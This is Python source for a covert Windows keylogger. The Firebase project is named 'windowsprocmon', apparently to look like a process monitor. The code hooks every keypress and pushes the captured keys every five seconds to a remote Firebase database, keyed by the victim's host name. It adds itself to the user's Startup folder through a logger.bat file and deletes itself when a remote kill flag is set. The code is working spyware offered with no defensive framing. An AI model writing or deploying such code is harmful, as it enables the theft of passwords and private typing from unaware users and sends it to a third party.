import os
import sys
import time
import json
import socket
import queue
import tempfile
import threading
import firebase_admin
from firebase_admin import credentials, db
import keyboard

# Firebase service account config
FIREBASE_JSON = {
    "type": "service_account",
    "project_id": "windowsprocmon",
    "private_key_id": "",
    "private_key": "",
    "client_email": "",
    "client_id": "",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40windowsprocmon.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}

# Identify device
device_name = socket.gethostname()

# Write Firebase credentials to temp file
with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.json') as f:
    f.write(json.dumps(FIREBASE_JSON).encode('utf-8'))
    config_path = f.name

# Firebase init
cred = credentials.Certificate(config_path)
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://windowsprocmon-default-rtdb.firebaseio.com/'
})

log_ref = db.reference(f'logs/{device_name}')
control_ref = db.reference(f'control/{device_name}')
print(f"✅ Firebase connected as {device_name}")

# Buffering
log_queue = queue.Queue()

def flush_buffer():
    while True:
        buffer = []
        while not log_queue.empty():
            buffer.append(log_queue.get())
        if buffer:
            try:
                log_ref.push({'keys': buffer})
                print(f"Sent {len(buffer)} keys")
            except Exception as e:
                print("Firebase push failed:", e)
        time.sleep(5)

# Key capture
def capture_keys():
    def on_key(event):
        log_queue.put(event.name)
    keyboard.on_press(on_key)
    threading.Thread(target=flush_buffer, daemon=True).start()
    keyboard.wait()

# Remote kill
def listen_for_kill():
    def check_kill():
        while True:
            if control_ref.child("delete").get():
                print("Kill signal received")
                remove_from_startup()
                try:
                    os.remove(os.path.realpath(sys.argv[0]))
                except:
                    pass
                os._exit(0)
            time.sleep(5)
    threading.Thread(target=check_kill, daemon=True).start()

# Startup setup
def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_path = os.path.join(startup_folder, "logger.bat")
    script_path = os.path.realpath(sys.argv[0])
    if not os.path.exists(bat_path):
        with open(bat_path, "w") as f:
            f.write(f'start "" "{script_path}"\n')
        print("Added to startup")

def remove_from_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_path = os.path.join(startup_folder, "logger.bat")
    if os.path.exists(bat_path):
        os.remove(bat_path)
        print("Startup entry removed")

# Run all
add_to_startup()
listen_for_kill()
capture_keys()
